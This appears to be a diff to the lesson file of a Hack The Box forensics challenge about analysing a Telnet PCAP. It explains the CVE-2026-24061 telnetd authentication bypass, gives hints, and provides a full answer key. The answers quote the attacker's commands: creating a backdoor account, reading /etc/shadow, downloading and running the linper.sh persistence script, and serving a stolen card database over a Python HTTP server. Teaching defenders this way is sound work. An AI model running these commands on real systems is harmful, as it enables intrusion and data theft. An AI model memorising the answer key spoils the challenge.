@@ -5,16 +5,15 @@
   "htbUrl": "https://app.hackthebox.com/sherlocks/Telly",
   "difficulty": "very_easy",
   "estimatedTime": "1 hour",
-  "keyTakeaway": "Telnet plaintext session analysis — reading attacker commands in plaintext, identifying authentication bypass (CVE-2026-24061), and tracing post-exploitation activity",
-  "tags": ["wireshark", "telnet", "plaintext", "follow-tcp-stream", "cve-2026-24061", "persistence", "exfiltration", "sqlite"],
+  "keyTakeaway": "Telnet plaintext session analysis — reading attacker commands in plaintext, identifying authentication bypass (CVE-2026-24061), and tracing post-exploitation activity including persistence, defense enumeration, C2 communication, and data exfiltration",
+  "tags": ["wireshark", "telnet", "plaintext", "follow-tcp-stream", "cve-2026-24061", "persistence", "exfiltration", "sqlite", "linper", "tripwire"],
   "fundamentals": {
-    "content": "## Telnet Analysis & Plaintext Protocol Risks\n\nIn the previous lesson you analyzed FTP, which transmits credentials in plaintext. Telnet goes even further — it transmits **the entire interactive session** in plaintext, including every command typed and every output received. This makes Telnet traffic a forensic goldmine: you can literally read the attacker's shell session keystroke by keystroke.\n\n### What Is Telnet?\n\n**Telnet** (TCP port 23) is a legacy remote access protocol from the 1960s. It provides an interactive shell session over the network with **zero encryption**. Unlike SSH (its modern replacement), Telnet sends everything — usernames, passwords, commands, and output — as readable ASCII text.\n\nThis means anyone who captures the network traffic can:\n- Read login credentials directly\n- See every command the attacker executes\n- Read every file the attacker accesses\n- Reconstruct the entire session from start to finish\n\n### Reading Telnet Sessions in Wireshark\n\nTelnet data is transmitted character-by-character (each keystroke is a separate packet), which makes individual packets look fragmented and hard to read. The correct approach is **Follow TCP Stream**:\n\n1. Filter for `telnet` (or `tcp.port == 23`)\n2. Right-click any Telnet packet → **Follow → TCP Stream**\n3. The stream view shows the full session as readable text\n\nIn the stream view, the two sides of the conversation are shown in different colors:\n- **Client (red/pink)** — what the attacker typed\n- **Server (blue)** — what the server responded\n\n### CVE-2026-24061: GNU InetUtils Telnet Authentication Bypass\n\nThis critical vulnerability (CVSS 9.8) in GNU InetUtils telnetd (versions 1.9.3 through 2.7) allows **complete authentication bypass**, granting root access without any credentials.\n\n**How it works:**\n\nThe Telnet protocol includes an option called `NEW_ENVIRON` that lets the client send environment variables to the server before login. The `telnetd` daemon passes these variables to the `login` program. The vulnerability: telnetd does **not sanitize** the `USER` variable before passing it to `login`.\n\nAn attacker sets:\n```\nUSER = -f root\n```\n\nThe daemon constructs the command:\n```\n/usr/bin/login -h [hostname] \"-f root\"\n```\n\nThe `-f` flag tells `login` to **skip authentication entirely** and log in as the specified user (root). The attacker gets a root shell without ever entering a password.\n\n### Recognizing Post-Exploitation in Telnet Sessions\n\nOnce you can read the attacker's session, look for these common post-exploitation actions:\n\n| Action | Commands to Watch For |\n|--------|----------------------|\n| **Reconnaissance** | `whoami`, `id`, `hostname`, `uname -a`, `cat /etc/passwd` |\n| **Persistence — user creation** | `useradd`, `adduser`, `passwd`, `usermod -aG sudo` |\n| **Persistence — scripts** | `wget`/`curl` downloading `.sh` scripts, `chmod +x`, execution |\n| **Defense evasion** | Checking/disabling security tools (IDS, Tripwire, auditd) |\n| **Data exfiltration** | `python3 -m http.server`, `scp`, `nc`, `curl -X POST` |\n\n### Extracting Exfiltrated Files\n\nAttackers often use Python's built-in HTTP server (`python3 -m http.server`) to serve files from the compromised host. When this happens, the file transfer appears as HTTP traffic in the PCAP. You can extract these files with:\n\n`File → Export Objects → HTTP → Save All`\n\nIf the exfiltrated file is a database (e.g., `.db`), you can open it locally with `sqlite3` to examine its contents and count records.",
+    "content": "## Telnet Analysis & Plaintext Protocol Risks\n\nIn the previous lesson you analyzed FTP, which transmits credentials in plaintext. Telnet goes even further — it transmits **the entire interactive session** in plaintext, including every command typed and every output received. This makes Telnet traffic a forensic goldmine: you can literally read the attacker's shell session keystroke by keystroke.\n\n### What Is Telnet?\n\n**Telnet** (TCP port 23) is a legacy remote access protocol from the 1960s. It provides an interactive shell session over the network with **zero encryption**. Unlike SSH (its modern replacement), Telnet sends everything — usernames, passwords, commands, and output — as readable ASCII text.\n\nThis means anyone who captures the network traffic can:\n- Read login credentials directly\n- See every command the attacker executes\n- Read every file the attacker accesses\n- Reconstruct the entire session from start to finish\n\n### Reading Telnet Sessions in Wireshark\n\nTelnet data is transmitted character-by-character (each keystroke is a separate packet), which makes individual packets look fragmented and hard to read. The correct approach is **Follow TCP Stream**:\n\n1. Filter for `telnet` (or `tcp.dstport == 23`)\n2. Right-click any Telnet packet → **Follow → TCP Stream**\n3. The stream view shows the full session as readable text\n\nIn the stream view, the two sides of the conversation are shown in different colors:\n- **Client (red/pink)** — what the attacker typed\n- **Server (blue)** — what the server responded\n\n### CVE-2026-24061: GNU InetUtils Telnet Authentication Bypass\n\nThis critical vulnerability (CVSS 9.8) in GNU InetUtils telnetd (versions through 2.7) allows **complete authentication bypass**, granting root access without any credentials.\n\n**How it works:**\n\nThe Telnet protocol includes an option called `NEW_ENVIRON` that lets the client send environment variables to the server before login. The `telnetd` daemon passes these variables to the `login` program. The vulnerability: telnetd does **not sanitize** the `USER` variable before passing it to `login`.\n\nAn attacker sets:\n```\nUSER = -f root\n```\n\nThe daemon constructs the command:\n```\n/usr/bin/login -h [hostname] \"-f root\"\n```\n\nThe `-f` flag tells `login` to **skip authentication entirely** and log in as the specified user (root). The attacker gets a root shell without ever entering a password.\n\n### Recognizing Post-Exploitation in Telnet Sessions\n\nOnce you can read the attacker's session, look for these common post-exploitation actions:\n\n| Action | Commands to Watch For |\n|--------|----------------------|\n| **Reconnaissance** | `whoami`, `id`, `hostname`, `uname -a`, `cat /etc/passwd` |\n| **Credential harvesting** | `cat /etc/shadow` — viewing password hashes |\n| **Persistence — user creation** | `useradd`, `adduser`, `chpasswd`, `usermod -aG sudo` |\n| **Persistence — scripts** | `wget`/`curl` downloading `.sh` scripts, `chmod +x`, execution |\n| **Defense evasion** | Checking/disabling security tools (IDS, Tripwire, auditd) |\n| **C2 communication** | Outbound connections to external IPs |\n| **Data exfiltration** | `python3 -m http.server`, `scp`, `nc`, `curl -X POST` |\n\n### Defense Enumeration with Persistence Scripts\n\nAttackers often use publicly available persistence scripts (like `linper.sh` from GitHub) to automate post-exploitation tasks. These scripts can:\n- Search for writable directories for staging\n- **Enumerate host-based defenses** (Tripwire, OSSEC, auditd)\n- Set up persistence mechanisms (cron jobs, SSH keys, services)\n\nThe output of these scripts is fully visible in the plaintext Telnet stream — you can see exactly what defenses were checked and what was found.\n\n### Extracting Exfiltrated Files\n\nAttackers often use Python's built-in HTTP server (`python3 -m http.server <port>`) to serve files from the compromised host. When this happens, the file transfer appears as HTTP traffic in the PCAP. You can extract these files with:\n\n`File → Export Objects → HTTP → Save All`\n\nIf the exfiltrated file is a database (e.g., `.db`), you can open it locally with `sqlite3` to examine its contents, list tables with `.tables`, and query records with `SELECT * FROM tablename;`.",
     "toolReferences": [
       {
         "tool": "Wireshark",
         "commands": [
-          "Filter: telnet — show Telnet control traffic",
-          "Filter: tcp.port == 23 — alternative Telnet filter",
+          "Filter: tcp.dstport == 23 — Telnet traffic",
           "Right-click → Follow → TCP Stream — read full session",
           "File → Export Objects → HTTP — extract files served via Python HTTP server",
           "View → Time Display Format → UTC Date and Time of Day — correct timestamps"
@@ -25,28 +24,31 @@
         "commands": [
           "sqlite3 file.db — open a SQLite database",
           ".tables — list all tables",
-          "SELECT COUNT(*) FROM tablename; — count records"
+          ".schema — show table structure",
+          "SELECT * FROM tablename; — query records"
         ]
       }
     ]
   },
   "hints": {
     "hints": [
-      "This challenge is almost entirely about reading a plaintext Telnet session. Filter for `telnet` and follow the TCP stream — you can read the entire attack from start to finish.",
-      "The server hostname is visible in the Telnet session banner or prompt. Look at what appears after the attacker connects.",
-      "The authentication bypass is a recent critical CVE in GNU InetUtils telnetd. The mechanism involves the `USER` environment variable and the `-f` flag to `/usr/bin/login`.",
-      "After gaining access, the attacker creates a backdoor user and downloads a persistence script. Read the commands in the stream — `useradd`/`adduser` for the user, `wget`/`curl` for the script.",
-      "The attacker exfiltrates a `.db` file using a Python HTTP server. Use `File → Export Objects → HTTP` to extract it, then open with `sqlite3` to count the records inside."
+      "This challenge is almost entirely about reading a plaintext Telnet session. Filter for `tcp.dstport == 23` and follow the TCP stream — you can read the entire attack from start to finish.",
+      "The server hostname is visible in the shell prompt after the attacker gains access. Look at what appears after the root login.",
+      "After gaining access, the attacker creates a backdoor user with `useradd` and sets its password with `chpasswd`. Read the full command to get both username and password.",
+      "The attacker views `/etc/shadow` — look for the password hashes. They also download a persistence script from a GitHub raw URL using `wget`.",
+      "The persistence script is executed with a specific flag to check what security defenses are installed. Read the output — it checks for a specific file integrity monitoring tool.",
+      "Look for outbound communication to an external IP — this is the C2 server. Then look for `python3 -m http.server` to find the exfiltration method and port.",
+      "Use `File → Export Objects → HTTP` to extract the exfiltrated database file. Open it with `sqlite3` and query the table to find specific records."
     ]
   },
   "solution": {
-    "content": "## Full Walkthrough\n\n**Scenario:** A Forela backup server running GNU InetUtils telnetd was compromised. The attacker exploited an authentication bypass vulnerability to gain root access, established persistence, and exfiltrated a database containing sensitive data. Since Telnet is plaintext, the entire attack is visible in the PCAP.\n\n**Key learning:** Because Telnet transmits everything in cleartext, this challenge is an exercise in reading an attacker's session. Unlike FTP (where you filter for specific commands), here you follow the TCP stream and literally read the attacker's terminal — every command they typed and every output they received.",
+    "content": "## Full Walkthrough\n\n**Scenario:** A Forela backup server running GNU InetUtils telnetd was compromised. The attacker exploited an authentication bypass vulnerability to gain root access, established persistence, enumerated defenses, communicated with a C2 server, and exfiltrated a database containing sensitive credit card data. Since Telnet is plaintext, the entire attack is visible in the PCAP.\n\n**Key learning:** Because Telnet transmits everything in cleartext, this challenge is an exercise in reading an attacker's session. Unlike FTP (where you filter for specific commands), here you follow the TCP stream and literally read the attacker's terminal — every command they typed and every output they received.\n\n**Key infrastructure:**\n\n| Role | IP Address |\n|------|----------|\n| Attacker | `192.168.72.131` |\n| Victim (backup server) | Telnet target |",
     "steps": [
       {
         "stepNumber": 1,
         "description": "Open the Telnet session and identify the server hostname",
-        "command": "Wireshark filter: telnet → right-click → Follow → TCP Stream",
-        "explanation": "Filter for `telnet` traffic and follow the TCP stream. The session opens with the server's login banner or hostname prompt. The server identifies itself in the session.\n\n**Answer:** `backup-secondary`"
+        "command": "Wireshark filter: tcp.dstport == 23 → right-click → Follow → TCP Stream",
+        "explanation": "Filter for Telnet traffic with `tcp.dstport == 23` and follow the TCP stream. The session reveals the server's shell prompt after the attacker gains root access. The hostname is visible in the prompt format `root@hostname`.\n\n**Answer:** `backup-secondary`"
       },
       {
         "stepNumber": 2,
@@ -57,8 +59,8 @@
       {
         "stepNumber": 3,
         "description": "Find the backdoor user account created for persistence",
-        "command": "Read the Telnet TCP stream — look for user creation commands",
-        "explanation": "Reading through the attacker's session, look for `useradd` or `adduser` commands. The attacker creates a backdoor account with a name designed to blend in as a legitimate service account, along with its password.\n\n**Answer:** `cleanupsvc:YouKnowWhoiam69`"
+        "command": "Read the Telnet TCP stream — look for useradd and chpasswd commands",
+        "explanation": "Reading through the attacker's session, look for user creation commands. The attacker runs:\n\n```\nsudo useradd -m -s /bin/bash cleanupsvc; echo \"cleanupsvc:YouKnowWhoiam69\" | sudo chpasswd\n```\n\nThis creates a backdoor account named `cleanupsvc` (designed to blend in as a legitimate service account) with a home directory and bash shell, then sets its password.\n\n**Answer:** `cleanupsvc:YouKnowWhoiam69`"
       },
       {
         "stepNumber": 4,
@@ -68,27 +70,51 @@
       },
       {
         "stepNumber": 5,
-        "description": "Identify the persistence script downloaded by the attacker",
-        "command": "Read the Telnet TCP stream — look for wget/curl commands",
-        "explanation": "In the session, the attacker downloads a script to maintain persistent access. Look for `wget` or `curl` commands in the stream. The script name suggests its purpose (Linux persistence).\n\n**Answer:** `linper.sh`"
+        "description": "Identify the sensitive file the attacker viewed",
+        "command": "Read the Telnet TCP stream — look for cat commands on sensitive files",
+        "explanation": "After creating the backdoor user, the attacker views `/etc/shadow` to see password hashes. The stream shows hashes for existing users (like `cyberjunkie`) and the newly created `cleanupsvc` account. Viewing `/etc/shadow` confirms the attacker has root privileges and is collecting credential data.\n\n**Answer:** `/etc/shadow`"
       },
       {
         "stepNumber": 6,
-        "description": "Determine what security defenses the persistence script checked",
-        "command": "Read the output of the persistence script execution in the stream",
-        "explanation": "After downloading and executing the persistence script, its output is visible in the plaintext Telnet stream. The script checks for host-based security controls — specifically a file integrity monitoring tool that could detect the attacker's modifications.\n\n**Answer:** Tripwire"
+        "description": "Find the persistence script downloaded by the attacker",
+        "command": "Read the Telnet TCP stream — look for wget/curl commands",
+        "explanation": "In the session, the attacker downloads a persistence script from GitHub using `wget`:\n\n```\nwget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh\n```\n\n`linper.sh` is a publicly available Linux persistence toolkit that automates common post-exploitation tasks like defense enumeration and persistence setup.\n\n**Answer:** `https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`"
       },
       {
         "stepNumber": 7,
-        "description": "Identify the data exfiltration method and timestamp",
-        "command": "Read the Telnet stream — look for data transfer commands",
-        "explanation": "The attacker uses Python's built-in HTTP server (`python3 -m http.server`) to serve files from the compromised host, then retrieves them from another machine. Look for the HTTP server command in the session and note its timestamp.\n\n**Answer:** `2026-01-27 10:49:54`"
+        "description": "Determine what the attacker did with the persistence script",
+        "command": "Read the script execution output in the Telnet stream",
+        "explanation": "The attacker executes the script with a specific flag to enumerate host-based security defenses:\n\n```\nbash linper.sh --enum-defenses\n```\n\nThe output shows:\n- `[+] Searching for writable directory to store temporary files`\n- `[+] Choosing /dev/shm`\n- `[+] Enumerating Tripwire Policies`\n- `[+] None Found`\n\nThe script checked for **Tripwire** (a file integrity monitoring tool) and found no policies configured — meaning the attacker's file modifications won't trigger any alerts.\n\n**Answer:** `bash linper.sh --enum-defenses`"
       },
       {
         "stepNumber": 8,
-        "description": "Extract the exfiltrated database and examine its contents",
-        "command": "File → Export Objects → HTTP → Save All, then: sqlite3 credit-cards-25-blackfriday.db",
-        "explanation": "The exfiltrated file is a SQLite database served via the Python HTTP server. Extract it using `File → Export Objects → HTTP → Save All`. Then open it locally:\n\n```bash\nsqlite3 credit-cards-25-blackfriday.db\n.tables\nSELECT COUNT(*) FROM <tablename>;\n```\n\nThis reveals the database contents — credit card records from a Black Friday sale. Count the records to answer the final question."
+        "description": "Identify the C2 server the attacker communicated with",
+        "command": "Read the Telnet TCP stream — look for outbound connections to external IPs",
+        "explanation": "In the session, the attacker communicates with an external IP address that serves as their command-and-control server. This IP appears in the Telnet stream output.\n\n**Answer:** `91.99.25.54`"
+      },
+      {
+        "stepNumber": 9,
+        "description": "Find the data exfiltration method and port",
+        "command": "Read the Telnet TCP stream — look for HTTP server commands",
+        "explanation": "The attacker uses Python's built-in HTTP server to serve files from the compromised host for exfiltration:\n\n```\npython3 -m http.server 6932\n```\n\nThe server output shows requests from `192.168.72.131` (the attacker's IP) retrieving files, confirming the exfiltration channel.\n\n**Answer:** `6932`"
+      },
+      {
+        "stepNumber": 10,
+        "description": "Determine the exfiltration timestamp and file",
+        "command": "Read the Python HTTP server log output in the Telnet stream",
+        "explanation": "The Python HTTP server logs show the exact requests made:\n\n```\n192.168.72.131 - - [27/Jan/2026 10:49:52] \"GET / HTTP/1.1\" 200 -\n192.168.72.131 - - [27/Jan/2026 10:49:54] \"GET /credit-cards-25-blackfriday.db HTTP/1.1\" 200 -\n```\n\nThe attacker first browsed the directory listing (200), got a favicon.ico 404, then successfully downloaded the database file at 10:49:54.\n\n**Answer:** `2026-01-27 10:49:54`"
+      },
+      {
+        "stepNumber": 11,
+        "description": "Extract and examine the exfiltrated database",
+        "command": "File → Export Objects → HTTP → Save credit-cards-25-blackfriday.db, then: sqlite3 credit-cards-25-blackfriday.db",
+        "explanation": "Extract the database file using `File → Export Objects → HTTP → Save All`. Then open it locally:\n\n```bash\nsqlite3 credit-cards-25-blackfriday.db\n.schema\n```\n\nThis reveals a `purchases` table with columns: `id`, `email`, `creditcardnumber`, `purchase_date`, `item_purchased`. Query it with:\n\n```sql\n.headers on\n.mode column\nSELECT * FROM purchases;\n```\n\nThe table contains credit card records from a Black Friday sale, including customer names, emails, card numbers, and purchase details.\n\n**Answer:** `purchases`"
+      },
+      {
+        "stepNumber": 12,
+        "description": "Find the specific customer record requested",
+        "command": "sqlite3: SELECT * FROM purchases WHERE email LIKE '%quinn%';",
+        "explanation": "Query the database for the specific customer record. Quinn Harris's entry:\n\n| id | email | creditcardnumber | purchase_date | item_purchased |\n|----|-------|-----------------|---------------|----------------|\n| 12 | quinn.harris@hotmail.com | 5312269047701209 | 2025-12-08 | 4K monitor |\n\n**Answer:** `quinn.harris@hotmail.com, 5312269047701209, 2025-12-08, 4K monitor`"
       }
     ]
   },
